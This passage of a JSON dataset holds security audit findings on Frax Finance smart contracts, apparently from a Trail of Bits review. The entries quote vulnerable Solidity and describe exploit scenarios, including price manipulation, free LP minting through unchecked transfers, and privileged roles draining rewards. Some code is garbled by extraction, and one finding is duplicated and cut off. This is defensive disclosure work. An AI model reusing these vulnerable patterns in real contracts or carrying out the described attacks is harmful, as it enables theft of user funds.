        "body": "The price_tolerance state variable of the CCFrax1to1AMM contract is set to 50,000, which, when using the xed point scaling factor inconsistent with the variables inline comment, which indicates the number 5,000, corresponding to 0.005. A price tolerance of 0.05 is probably too high and can lead to unacceptable arbitrage activities; this suggests that price_tolerance should be set to the value indicated in the code comment. 6 1 0 , corresponds to 0.05. This is uint256 public price_tolerance = 50000 ; // E6. 5000 = .995 to 1.005 Figure 12.1: The price_tolerance state variable ( CCFrax1to1AMM.sol#56 ) Exploit Scenario This issue exacerbates the exploit scenario presented in issue TOB-FRSOL-008 . Given that scenario, but with a price tolerance of 50,000, Alice is able to gain $5459 through arbitrage. A higher price tolerance leads to higher arbitrage prots. Recommendations Short term, set the price tolerance to 5,000 both in the code and on the deployed contract. Long term, ensure that comments are in sync with the code and that constants are correct.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. Signicant code duplication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "Signicant code duplication exists throughout the codebase. Duplicate code can lead to incomplete xes or inconsistent behavior (e.g., because the code is modied in one location but not in all). For example, the FraxUnifiedFarmTemplate.sol and StakingRewardsMultiGauge.sol les both contain a retroCatchUp function. As seen in gure 13.1, the functions are almost identical. // If the period expired, renew it function retroCatchUp () internal { // Pull in rewards from the // If the period expired, renew it function retroCatchUp () internal { // Pull in rewards from the rewards distributor rewards distributor rewards_distributor. distributeReward ( addr ess ( this )); rewards_distributor. distributeReward ( addr ess ( this )); // Ensure the provided reward // Ensure the provided reward amount is not more than the balance in the contract. amount is not more than the balance in the contract. // This keeps the reward rate in // This keeps the reward rate in the right range, preventing overflows due to the right range, preventing overflows due to // very high values of rewardRate // very high values of rewardRate in the earned and rewardsPerToken functions; in the earned and rewardsPerToken functions; // Reward + leftover must be less // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow. than 2^256 / 10^18 to avoid overflow. uint256 num_periods_elapsed = uint256 num_periods_elapsed = uint256 ( block .timestamp - periodFinish) / rewardsDuration; // Floor division to the nearest period uint256 ( block .timestamp. sub (periodFinish) ) / rewardsDuration; // Floor division to the nearest period // Make sure there are enough // Make sure there are enough tokens to renew the reward period tokens to renew the reward period for ( uint256 i = 0 ; i < for ( uint256 i = 0 ; i < rewardTokens.length; i++){ rewardTokens.length; i++){ require (( rewardRates (i) * rewardsDuration * (num_periods_elapsed + 1 )) <= ERC20 (rewardTokens[i]). balanceOf ( address ( this )), string ( abi . encodePacked ( \"Not enough reward tokens available: \" , rewardTokens[i])) ); require ( rewardRates (i). mul (rewardsDuratio n). mul (num_periods_elapsed + 1 ) <= ERC20 (rewardTokens[i]). balanceOf ( address ( this )), string ( abi . encodePacked ( \"Not enough reward tokens available: \" , rewardTokens[i])) ); } } // uint256 old_lastUpdateTime = // uint256 old_lastUpdateTime = lastUpdateTime; lastUpdateTime; // uint256 new_lastUpdateTime = // uint256 new_lastUpdateTime = block.timestamp; block.timestamp; // lastUpdateTime = periodFinish; periodFinish = periodFinish + // lastUpdateTime = periodFinish; periodFinish = ((num_periods_elapsed + 1 ) * rewardsDuration); periodFinish. add ((num_periods_elapsed. add ( 1 )). mul (rewardsDuration)); // Update the rewards and time _updateStoredRewardsAndTime (); _updateStoredRewardsAndTime (); emit // Update the fraxPerLPStored fraxPerLPStored = RewardsPeriodRenewed ( address (stakingToken )); fraxPerLPToken (); } } Figure 13.1: Left: contracts/Staking/FraxUnifiedFarmTemplate.sol#L463-L490 Right: contracts/Staking/StakingRewardsMultiGauge.sol#L637-L662 Exploit Scenario Alice, a Frax Finance developer, is asked to x a bug in the retroCatchUp function. Alice updates one instance of the function, but not both. Eve discovers a copy of the function in which the bug is not xed and exploits the bug. Recommendations Short term, perform a comprehensive code review and identify pieces of code that are semantically similar. Factor out those pieces of code into separate functions where it makes sense to do so. This will reduce the risk that those pieces of code diverge after the code is updated. Long term, adopt code practices that discourage code duplication. Doing so will help to prevent this problem from recurring.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "14. StakingRewardsMultiGauge.recoverERC20 allows token managers to steal rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The recoverERC20 function in the StakingRewardsMultiGauge contract allows token managers to steal rewards. This violates conventions established by other Frax Solidity contracts in which recoverERC20 can be called only by the contract owner. The relevant code appears in gure 14.1. The recoverERC20 function checks whether the caller is a token manager and, if so, sends him the requested amount of the token he manages. Convention states that this function should be callable only by the contract owner. Moreover, its purpose is typically to recover tokens unrelated to the contract. // Added to support recovering LP Rewards and other mistaken tokens from other systems to be distributed to holders function recoverERC20 ( address tokenAddress , uint256 tokenAmount ) external onlyTknMgrs ( tokenAddress ) { // Check if the desired token is a reward token bool isRewardToken = false ; for ( uint256 i = 0 ; i < rewardTokens.length; i++){ if (rewardTokens[i] == tokenAddress) { isRewardToken = true ; break ; } } // Only the reward managers can take back their reward tokens if (isRewardToken && rewardManagers[tokenAddress] == msg.sender ){ ERC20 (tokenAddress). transfer ( msg.sender , tokenAmount); emit Recovered ( msg.sender , tokenAddress, tokenAmount); return ; } Figure 14.1: contracts/Staking/StakingRewardsMultiGauge.sol#L798-L814 For comparison, consider the CCFrax1to1AMM contracts recoverERC20 function. It is callable only by the contract owner and specically disallows transferring tokens used by the contract. function recoverERC20 ( address tokenAddress , uint256 tokenAmount ) external onlyByOwner { require (!is_swap_token[tokenAddress], \"Cannot withdraw swap tokens\" ); TransferHelper. safeTransfer ( address (tokenAddress), msg.sender , tokenAmount); } Figure 14.2: contracts/Misc_AMOs/__CROSSCHAIN/Moonriver/CCFrax1to1AMM.sol#L340-L344 Exploit Scenario Eve tricks Frax Finance into making her a token manager for the StakingRewardsMultiGauge contract. When the contracts token balance is high, Eve withdraws the tokens and vanishes. Recommendations Short term, eliminate the token managers ability to call recoverERC20 . This will bring recoverERC20 in line with established conventions regarding the functions purpose and usage. Long term, regularly review all uses of contract modiers, such as onlyTknMgrs . Doing so will help to expose bugs like the one described here.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Convex_AMO_V2 custodian can withdraw rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The Convex_AMO_V2 custodian can withdraw rewards. This violates conventions established by other Frax Solidity contracts in which the custodian is only able to pause operations. The relevant code appears in gure 15.1. The withdrawRewards function is callable by the contract owner, governance, or the custodian. This provides signicantly more power to the custodian than other contracts in the Frax Solidity repository. function withdrawRewards ( uint256 crv_amt , uint256 cvx_amt , uint256 cvxCRV_amt , uint256 fxs_amt ) external onlyByOwnGovCust { if (crv_amt > 0 ) TransferHelper. safeTransfer (crv_address, msg.sender , crv_amt); if (cvx_amt > 0 ) TransferHelper. safeTransfer ( address (cvx), msg.sender , cvx_amt); if (cvxCRV_amt > 0 ) TransferHelper. safeTransfer (cvx_crv_address, msg.sender , cvxCRV_amt); if (fxs_amt > 0 ) TransferHelper. safeTransfer (fxs_address, msg.sender , fxs_amt); } Figure 15.1: contracts/Misc_AMOs/Convex_AMO_V2.sol#L425-L435 Exploit Scenario Eve tricks Frax Finance into making her the custodian for the Convex_AMO_V2 contract. When the unclaimed rewards are high, Eve withdraws them and vanishes. Recommendations Short term, determine whether the Convex_AMO_V2 custodian requires the ability to withdraw rewards. If so, document this as a security concern. This will help users to understand the risks associated with depositing funds into the Convex_AMO_V2 contract. Long term, implement a mechanism that allows rewards to be distributed without requiring the intervention of an intermediary. Reducing human involvement will increase users overall condence in the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. The FXS1559 documentation is inaccurate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The FXS1559 documentation states that excess FRAX tokens are exchanged for FXS tokens, and the FXS tokens are then burned. However, the reality is that those FXS tokens are redistributed to veFXS holders. More specically, the documentation states the following: Specically, every time interval t, FXS1559 calculates the excess value above the CR [collateral ration] and mints FRAX in proportion to the collateral ratio against the value. It then uses the newly minted currency to purchase FXS on FRAX-FXS AMM pairs and burn it. However, in the FXS1559_AMO_V3 contract, the number of FXS tokens that are burned is a tunable parameter (see gures 16.1 and 16.2). The parameter defaults to, and is currently, 0 (according to Etherscan). burn_fraction = 0 ; // Give all to veFXS initially Figure 16.1: contracts/Misc_AMOs/FXS1559_AMO_V3.sol#L87 // Calculate the amount to burn vs give to the yield distributor uint256 amt_to_burn = fxs_received. mul (burn_fraction). div (PRICE_PRECISION); uint256 amt_to_yield_distributor = fxs_received. sub (amt_to_burn); // Burn some of the FXS burnFXS (amt_to_burn); // Give the rest to the yield distributor FXS. approve ( address (yieldDistributor), amt_to_yield_distributor); yieldDistributor. notifyRewardAmount (amt_to_yield_distributor); Figure 16.2: contracts/Misc_AMOs/FXS1559_AMO_V3.sol#L159-L168 Exploit Scenario Frax Finance is publicly shamed for claiming that FXS is deationary when it is not. Condence in FRAX declines, and it loses its peg as a result. Recommendations Short term, correct the documentation to indicate that some proportion of FXS tokens may be distributed to veFXS holders. This will help users to form correct expectations regarding the operation of the protocol. Long term, consider whether FXS tokens need to be redistributed. The documentation makes a compelling argument for burning FXS tokens. Adjusting the code to match the documentation might be a better way of resolving this discrepancy.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "17. Univ3LiquidityAMO defaults the price of collateral to $1 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The Uniswap V3 AMOs default to a price of $1 unless an oracle is set, and it is not clear whether an oracle is or will be set. If the contract lacks an oracle, the contract will return the number of collateral units instead of the price of collateral, meaning that it will value each unit of collateral at $1 instead of the correct price. While this may not be an issue for stablecoins, this pattern is error-prone and unclear. It could introduce errors in the global collateral value of FRAX since the protocol may underestimate (or overestimate) the value of the collateral if the price is above (or below) $1. col_bal_e188 is the balance, not the price, of the tokens. When collatDolarValue is called without an oracle, the contract falls back to valuing each token at $1. function freeColDolVal() public view returns ( uint256 ) { uint256 value_tally_e18 = 0 ; for ( uint i = 0 ; i < collateral_addresses.length; i++){ ERC20 thisCollateral = ERC20(collateral_addresses[i]); uint256 missing_decs = uint256 ( 18 ).sub(thisCollateral.decimals()); uint256 col_bal_e18 = thisCollateral.balanceOf( address ( this )).mul( 10 ** missing_decs); uint256 col_usd_value_e18 = collatDolarValue(oracles[collateral_addresses[i]], col_bal_e18); value_tally_e18 = value_tally_e18.add(col_usd_value_e18); } return value_tally_e18; } Figure 17.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L161-L171 function collatDolarValue (OracleLike oracle, uint256 balance ) public view returns ( uint256 ) { if ( address (oracle) == address ( 0 )) return balance; return balance.mul(oracle.read()).div( 1 ether); } Figure 17.2: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L174-L177 Exploit Scenario The value of a collateral token is $0.50. Instead of incentivizing recollateralization, the protocol indicates that it is adequately collateralized (or overcollateralized). However, the price of the collateral token is half the $1 default value, and the protocol needs to respond to the insucient collateral backing FRAX. Recommendations Short term, integrate the Uniswap V3 AMOs properly with an oracle, and remove the hard-coded price assumptions. Long term, review and test the eect of each pricing function on the global collateral value and ensure that the protocol responds correctly to changes in collateralization.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "18. calc_withdraw_one_coin is vulnerable to manipulation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The showAllocations function determines the amount of collateral in dollars that a contract holds. calc_withdraw_one_coin is a Curve AMM function based on the current state of the pool and changes as trades are made through the pool. This spot price can be manipulated using a ash loan or large trade similar to the one described in TOB-FRSOL-006 . function showAllocations () public view returns (uint256[ 10 ] memory return_arr) { // ------------LP Balance------------ // Free LP uint256 lp_owned = (mim3crv_metapool.balanceOf(address(this))); // Staked in the vault uint256 lp_value_in_vault = MIM3CRVInVault(); lp_owned = lp_owned.add(lp_value_in_vault); // ------------3pool Withdrawable------------ uint256 mim3crv_supply = mim3crv_metapool.totalSupply(); uint256 mim_withdrawable = 0 ; uint256 _3pool_withdrawable = 0 ; if (lp_owned > 0 ) _3pool_withdrawable = mim3crv_metapool.calc_withdraw_one_coin(lp_owned, 1 ); // 1: 3pool index Figure 18.1: contracts/Misc_AMOs/MIM_Convex_AMO.sol#L145-160 Exploit Scenario MIM_Convex_AMO is included in FRAX.globalCollateralValue , and the FraxPoolV3.bonus_rate is nonzero. An attacker manipulates the return value of calc_withdraw_one_coin , causing the protocol to undervalue the collateral and reach a less-than-desired collateralization ratio. The attacker then calls FraxPoolV3.recollateralize , adds collateral, and sells the newly minted FXS tokens, including a bonus, for prot. Recommendations Short term, do not use the Curve AMM spot price to value collateral. Long term, use an oracle or get_virtual_price to reduce the likelihood of manipulation. References  Medium, \"Economic Attack on Harvest FinanceDeep Dive\"",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Incorrect valuation of LP tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The Frax Protocol uses liquidity pool (LP) tokens as collateral and includes their value in the global collateralization value. In addition to the protocols incorrect inclusion of FRAX as collateral (see TOB-FRSOL-024 ), the calculation of the value pool tokens representing Uniswap V2-like and Uniswap V3 positions is inaccurate. As a result, the global collateralization value could be incorrect. getAmount0ForLiquidity ( getAmount1ForLiquidity) returns the amount, not the value, of token0 (token1) in that price range; the price of FRAX should not be assumed to be $1, for the same reasons outlined in TOB-FRSOL-017 . The userStakedFrax helper function uses the metadata of each Uniswap V3 NFT to calculate the collateral value of the underlying tokens. Rather than using the current range, the function calls getAmount0ForLiquidty using the range set by a liquidity provider. This suggests that the current price of the assets is within the range set by the liquidity provider, which is not necessarily the case. If the market price is outside the given range, the underlying position will contain 100% of one token rather than a portion of both tokens. Thus, the underlying tokens will not be at a 50% allocation at all times, so this assumption is false. The actual redemption value of the NFT is not the same as what was deposited since the underlying token amounts and prices change with market conditions. In short, the current calculation does not update correctly as the price of assets change, and the global collateral value will be wrong. function userStakedFrax (address account ) public view returns (uint256) { uint256 frax_tally = 0 ; LockedNFT memory thisNFT; for (uint256 i = 0 ; i < lockedNFTs[account].length; i++) { thisNFT = lockedNFTs[account][i]; uint256 this_liq = thisNFT.liquidity; if (this_liq > 0 ){ uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(thisNFT.tick_lower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(thisNFT.tick_upper); if (frax_is_token0){ frax_tally = frax_tally.add(LiquidityAmounts.getAmount0ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, uint128(thisNFT.liquidity))); } else { frax_tally = frax_tally.add(LiquidityAmounts.getAmount1ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, uint128(thisNFT.liquidity))); } } } // In order to avoid excessive gas calculations and the input tokens ratios. 50% FRAX is assumed // If this were Uni V2, it would be akin to reserve0 & reserve1 math // There may be a more accurate way to calculate the above... return frax_tally.div( 2 ); } Figure 19.1: contracts/Staking/FraxUniV3Farm_Volatile.sol#L241-L263 In addition, the value of Uniswap V2 LP tokens is calculated incorrectly. The return value of getReserves is vulnerable to manipulation, as described in TOB-FRSOL-006 . Thus, the value should not be used to price LP tokens, as the value will vary signicantly when trades are performed through the given pool. Imprecise uctuations in the LP tokens values will result in an inaccurate global collateral value. function lpTokenInfo ( address pair_address ) public view returns ( uint256 [ 4 ] memory return_info) { // Instantiate the pair IUniswapV2Pair the_pair = IUniswapV2Pair(pair_address); // Get the reserves uint256 [] memory reserve_pack = new uint256 []( 3 ); // [0] = FRAX, [1] = FXS, [2] = Collateral ( uint256 reserve0 , uint256 reserve1 , ) = (the_pair.getReserves()); { // Get the underlying tokens in the LP address token0 = the_pair.token0(); address token1 = the_pair.token1(); // Test token0 if (token0 == canonical_frax_address) reserve_pack[ 0 ] = reserve0; else if (token0 == canonical_fxs_address) reserve_pack[ 1 ] = reserve0; else if (token0 == arbi_collateral_address) reserve_pack[ 2 ] = reserve0; // Test token1 if (token1 == canonical_frax_address) reserve_pack[ 0 ] = reserve1; else if (token1 == canonical_fxs_address) reserve_pack[ 1 ] = reserve1; else if (token1 == arbi_collateral_address) reserve_pack[ 2 ] = reserve1; } Figure 19.2: contracts/Misc_AMOs/__CROSSCHAIN/Arbitrum/SushiSwapLiquidityAMO_ARBI.sol #L196-L217 Exploit Scenario The value of LP positions does not reect a sharp decline in the market value of the underlying tokens. Rather than incentivizing recollateralization, the protocol continues to mint FRAX tokens and causes the true collateralization ratio to fall even further. Although the protocol appears to be solvent, due to incorrect valuations, it is not. Recommendations Short term, discontinue the use of LP tokens as collateral since the valuations are inaccurate and misrepresent the amount of collateral backing FRAX. Long term, use oracles to derive the fair value of LP tokens. For Uniswap V2, this means using the constant product to compute the value of the underlying tokens independent of the spot price. For Uniswap V3, this means using oracles to determine the current composition of the underlying tokens that the NFT represents. References   Christophe Michel, \"Pricing LP tokens | Warp Finance hack\" Alpha Finance, \"Fair Uniswap's LP Token Pricing\"",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "20. Missing check of return value of transfer and transferFrom ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "Some tokens, such as BAT, do not precisely follow the ERC20 specication and will return false or fail silently instead of reverting. Because the codebase does not consistently use OpenZeppelins SafeERC20 library, the return values of calls to transfer and transferFrom should be checked. However, return value checks are missing from these calls in many areas of the code, opening the TWAMM contract (the time-weighted automated market maker) to severe vulnerabilities. function provideLiquidity(uint256 lpTokenAmount) external { require (totalSupply() != 0 , 'EC3' ); //execute virtual orders longTermOrders.executeVirtualOrdersUntilCurrentBlock(reserveMap); //the ratio between the number of underlying tokens and the number of lp tokens must remain invariant after mint uint256 amountAIn = lpTokenAmount * reserveMap[tokenA] / totalSupply(); uint256 amountBIn = lpTokenAmount * reserveMap[tokenB] / totalSupply(); ERC20(tokenA).transferFrom( msg.sender , address( this ), amountAIn); ERC20(tokenB).transferFrom( msg.sender , address( this ), amountBIn); [...] Figure 20.1: contracts/FPI/TWAMM.sol#L125-136 Exploit Scenario Frax deploys the TWAMM contract. Pools are created with tokens that do not revert on failure, allowing an attacker to call provideLiquidity and mint LP tokens for free; the attacker does not have to deposit funds since the transferFrom call fails silently or returns false . Recommendations Short term, x the instance described above. Then, x all instances detected by slither . --detect unchecked-transfer . Long term, review the Token Integration Checklist in appendix D and integrate Slither into the projects CI pipeline to prevent regression and catch new instances proactively.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "21. A rewards distributor does not exist for each reward token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The FraxUnifiedFarmTemplate contracts setGaugeController function (gure 21.1) has the onlyTknMgrs modier. All other functions with the onlyTknMgrs modier set a value in an array keyed only to the calling token managers token index. Except for setGaugeController , which sets the global rewards_distributor state variable, all other functions that set global state variables have the onlyByOwnGov modier. This modier is stricter than onlyTknMgrs , in that it cannot be called by token managers. As a result, any token manager can set the rewards distributor that will be used by all tokens. This exposes the underlying issue: there should be a rewards distributor for each token instead of a single global distributor, and a token manager should be able to set the rewards distributor only for her token. function setGaugeController ( address reward_token_address , address _rewards_distributor_address , address _gauge_controller_address ) external onlyTknMgrs(reward_token_address) { gaugeControllers[rewardTokenAddrToIdx[reward_token_address]] = _gauge_controller_address; rewards_distributor = IFraxGaugeFXSRewardsDistributor(_rewards_distributor_address); } Figure 21.1: The setGaugeController function ( FraxUnifiedFarmTemplate.sol#639642 ) Exploit Scenario Reward manager A calls setGaugeController to set his rewards distributor. Then, reward manager B calls setGaugeController to set his rewards distributor, overwriting the rewards distributor that A set. Later, sync is called, which in turn calls retroCatchUp . As a result, distributeRewards is called on Bs rewards distributor; however, distributeRewards is not called on As rewards distributor. Recommendations Short term, replace the global rewards distributor with an array that is indexed by token index to store rewards distributors, and ensure that the system calls distributeRewards on all reward distributors within the retroCatchUp function. Long term, ensure that token managers cannot overwrite each others settings.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "22. minVeFXSForMaxBoost can be manipulated to increase rewards ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "minVeFXSForMaxBoost is calculated based on the current spot price when a user stakes Uniswap V2 LP tokens. If an attacker manipulates the spot price of the pool prior to staking LP tokens, the reward boost will be skewed upward, thereby increasing the amount of rewards earned. The attacker will earn outsized rewards relative to the amount of liquidity provided. function fraxPerLPToken () public view returns ( uint256 ) { // Get the amount of FRAX 'inside' of the lp tokens uint256 frax_per_lp_token ; // Uniswap V2 // ============================================ { [...] uint256 total_frax_reserves ; ( uint256 reserve0 , uint256 reserve1 , ) = (stakingToken.getReserves()); Figure 22.1: contracts/Staking/FraxCrossChainFarmSushi.sol#L242-L250 function userStakedFrax ( address account ) public view returns ( uint256 ) { return (fraxPerLPToken()).mul(_locked_liquidity[account]).div(1e18); } function minVeFXSForMaxBoost ( address account ) public view returns ( uint256 ) { return (userStakedFrax(account)).mul(vefxs_per_frax_for_max_boost).div(MULTIPLIER_PRECISION ); } function veFXSMultiplier ( address account ) public view returns ( uint256 ) { if ( address (veFXS) != address ( 0 )){ // The claimer gets a boost depending on amount of veFXS they have relative to the amount of FRAX 'inside' // of their locked LP tokens uint256 veFXS_needed_for_max_boost = minVeFXSForMaxBoost(account); [...] Figure 22.2: contracts/Staking/FraxCrossChainFarmSushi.sol#L260-L272 Exploit Scenario An attacker sells a large amount of FRAX through the incentivized Uniswap V2 pool, increasing the amount of FRAX in the reserve. In the same transaction, the attacker calls stakeLocked and deposits LP tokens. The attacker's reward boost, new_vefxs_multiplier , increases due to the large trade, giving the attacker outsized rewards. The attacker then swaps his tokens back through the pool to prevent losses. Recommendations Short term, do not use the Uniswap spot price to calculate reward boosts. Long term, use canonical and audited rewards contracts for Uniswap V2 liquidity mining, such as MasterChef.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "23. Most collateral is not directly redeemable by depositors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The following describes the on-chain situation on December 20, 2021. The Frax stablecoin has a total supply of 1.5 billion FRAX. Anyone can mint new FRAX tokens by calling FraxPoolV3.mintFrax and paying the necessary amount of collateral and FXS. Conversely, anyone can redeem his or her FRAX for collateral and FXS by calling FraxPoolV3.redeemFrax . However, the Frax team manually moves collateral from the FraxPoolV3 contract into AMO contracts in which the collateral is used to generate yield. As a result, only $5 million (0.43%) of the collateral backing FRAX remains in the FraxPoolV3 contract and is available for redemption. If those $5 million are redeemed, the Frax Finance team would have to manually move collateral from the AMOs to FraxPoolV3 to make further redemptions possible. Currently, $746 million (64%) of the collateral backing FRAX is managed by the ConvexAMO contract. FRAX owners cannot access the ConvexAMO contract, as all of its operations can be executed only by the Frax team. Exploit Scenario Owners of FRAX want to use the FraxPoolV3 contracts redeemFrax function to redeem more than $5 million worth of FRAX for the corresponding amount of collateral. The redemption fails, as only $5 million worth of USDC is in the FraxPoolV3 contract. From the redeemers' perspectives, FRAX is no longer exchangeable into something worth $1, removing the base for its stable price. Recommendations Short term, deposit more FRAX into the FraxPoolV3 contract so that the protocol can support a larger volume of redemptions without requiring manual intervention by the Frax team. Long term, implement a mechanism whereby the pools can retrieve FRAX that is locked in AMOs to pay out redemptions.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "24. FRAX.globalCollateralValue counts FRAX as collateral ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "Each unit of FRAX represents $1 multiplied by the collateralization ratio of debt. That is, if the collateralization ratio is 86%, the Frax Protocol owes each holder of FRAX $0.86. Instead of accounting for this as a liability, the protocol includes this debt as an asset backing FRAX. In other words, FRAX is backed in part by FRAX. Because the FRAX.globalCollateralValue includes FRAX as an asset and not debt, the true collateralization ratio is lower than stated, and users cannot redeem FRAX for the underlying collateral in mass for reasons beyond those described in TOB-FRSOL-023 . This issue occurs extensively throughout the code. For instance, the amount FRAX in a Uniswap V3 liquidity position is included in the contracts collateral value. function TotalLiquidityFrax () public view returns ( uint256 ) { uint256 frax_tally = 0 ; Position memory thisPosition; for ( uint256 i = 0 ; i < positions_array.length; i++) { thisPosition = positions_array[i]; uint128 this_liq = thisPosition.liquidity; if (this_liq > 0 ){ uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(thisPosition.tickLower); uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(thisPosition.tickUpper); if (thisPosition.collateral_address > 0x853d955aCEf822Db058eb8505911ED77F175b99e ){ // if address(FRAX) < collateral_address, then FRAX is token0 frax_tally = frax_tally.add(LiquidityAmounts.getAmount0ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, this_liq)); } else { frax_tally = frax_tally.add(LiquidityAmounts.getAmount1ForLiquidity(sqrtRatioAX96, sqrtRatioBX96, this_liq)); } } } Figure 24.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L199-L216 In another instance, the value of FRAX in FRAX/token liquidity positions on Arbitrum is counted as collateral. Again, FRAX should be counted as debt and not collateral. function lpTokenInfo ( address pair_address ) public view returns ( uint256 [ 4 ] memory return_info) { // Instantiate the pair IUniswapV2Pair the_pair = IUniswapV2Pair(pair_address); // Get the reserves uint256 [] memory reserve_pack = new uint256 []( 3 ); // [0] = FRAX, [1] = FXS, [2] = Collateral ( uint256 reserve0 , uint256 reserve1 , ) = (the_pair.getReserves()); { // Get the underlying tokens in the LP address token0 = the_pair.token0(); address token1 = the_pair.token1(); // Test token0 if (token0 == canonical_frax_address) reserve_pack[ 0 ] = reserve0; else if (token0 == canonical_fxs_address) reserve_pack[ 1 ] = reserve0; else if (token0 == arbi_collateral_address) reserve_pack[ 2 ] = reserve0; // Test token1 if (token1 == canonical_frax_address) reserve_pack[ 0 ] = reserve1; else if (token1 == canonical_fxs_address) reserve_pack[ 1 ] = reserve1; else if (token1 == arbi_collateral_address) reserve_pack[ 2 ] = reserve1; } // Get the token rates return_info[ 0 ] = (reserve_pack[ 0 ] * 1e18) / (the_pair.totalSupply()); return_info[ 1 ] = (reserve_pack[ 1 ] * 1e18) / (the_pair.totalSupply()); return_info[ 2 ] = (reserve_pack[ 2 ] * 1e18) / (the_pair.totalSupply()); // Set the pair type (used later) if (return_info[ 0 ] > 0 && return_info[ 1 ] == 0 ) return_info[ 3 ] = 0 ; // FRAX/XYZ else if (return_info[ 0 ] == 0 && return_info[ 1 ] > 0 ) return_info[ 3 ] = 1 ; // FXS/XYZ else if (return_info[ 0 ] > 0 && return_info[ 1 ] > 0 ) return_info[ 3 ] = 2 ; // FRAX/FXS else revert( \"Invalid pair\" ); } Figure 24.2: contracts/Misc_AMOs/__CROSSCHAIN/Arbitrum/SushiSwapLiquidityAMO_ARBI.sol #L196-L229 Exploit Scenario Users attempt to redeem FRAX for USDC, but the collateral backing FRAX is, in part, FRAX itself, and not enough collateral is available for redemption. The collateralization ratio does not accurately reect when the protocol is insolvent. That is, it indicates that FRAX is fully collateralized in the scenario in which 100% of FRAX is backed by FRAX. Recommendations Short term, revise FRAX.globalCollateralValue so that it does not count FRAX as collateral, and ensure that the protocol deposits the necessary amount of collateral to ensure the collateralization ratio is reached. Long term, after xing this issue, continue reviewing how the protocol accounts for collateral and ensure the design is sound.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "17. Univ3LiquidityAMO defaults the price of collateral to $1 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "body": "The Uniswap V3 AMOs default to a price of $1 unless an oracle is set, and it is not clear whether an oracle is or will be set. If the contract lacks an oracle, the contract will return the number of collateral units instead of the price of collateral, meaning that it will value each unit of collateral at $1 instead of the correct price. While this may not be an issue for stablecoins, this pattern is error-prone and unclear. It could introduce errors in the global collateral value of FRAX since the protocol may underestimate (or overestimate) the value of the collateral if the price is above (or below) $1. col_bal_e188 is the balance, not the price, of the tokens. When collatDolarValue is called without an oracle, the contract falls back to valuing each token at $1. function freeColDolVal() public view returns ( uint256 ) { uint256 value_tally_e18 = 0 ; for ( uint i = 0 ; i < collateral_addresses.length; i++){ ERC20 thisCollateral = ERC20(collateral_addresses[i]); uint256 missing_decs = uint256 ( 18 ).sub(thisCollateral.decimals()); uint256 col_bal_e18 = thisCollateral.balanceOf( address ( this )).mul( 10 ** missing_decs); uint256 col_usd_value_e18 = collatDolarValue(oracles[collateral_addresses[i]], col_bal_e18); value_tally_e18 = value_tally_e18.add(col_usd_value_e18); } return value_tally_e18; } Figure 17.1: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L161-L171 function collatDolarValue (OracleLike oracle, uint256 balance ) public view returns ( uint256 ) { if ( address (oracle) == address ( 0 )) return balance; return balance.mul(oracle.read()).div( 1 ether); } Figure 17.2: contracts/Misc_AMOs/UniV3LiquidityAMO_V2.sol#L174-L177 Exploit Scenario The value of a collateral token is $0.50. Instead of incentivizing recollateralization, the protocol indicates that it is adequately collateralized (or overcollateralized). However, the price of the collateral token is half 